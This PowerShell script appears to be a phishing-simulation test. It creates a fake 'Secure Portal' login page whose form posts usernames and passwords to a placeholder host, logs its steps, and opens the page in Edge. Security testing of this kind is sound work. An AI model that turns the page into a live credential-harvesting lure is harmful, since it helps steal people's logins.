# Define the log file path
$logFile = "C:\ProgramData\phishing_test.log"
$scriptName = "credential_harvesting_sim.ps1"

# Function to log messages
function Log-Message {
    param (
        [string]$message,
        [string]$level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$level] [$scriptName] $message"
    Add-Content -Path $logFile -Value $logEntry
}

# Define the simulated login page HTML content
$loginPageContent = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Login</title>
</head>
<body>
    <h1>Secure Portal</h1>
    <form action="http://example-phishing-test.local/submit" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <button type="submit">Login</button>
    </form>
</body>
</html>
"@

# Define the output file path
$loginPagePath = "C:\ProgramData\SimulatedLogin.html"

# Start logging
Log-Message "Starting creation of simulated credential harvesting page."

try {
    # Create or overwrite the simulated login page file
    $loginPageContent | Out-File -FilePath $loginPagePath -Force -Encoding UTF8
    Log-Message "Simulated login page created at $loginPagePath."

    # Optional: Open the login page in a browser for testing
    Start-Process "msedge.exe" -ArgumentList $loginPagePath

} catch {
    $errorMessage = "An error occurred while creating the simulated login page: $_"
    Write-Host $errorMessage
    Log-Message $errorMessage "ERROR"
}

# End logging
Log-Message "Simulated credential harvesting page creation completed."
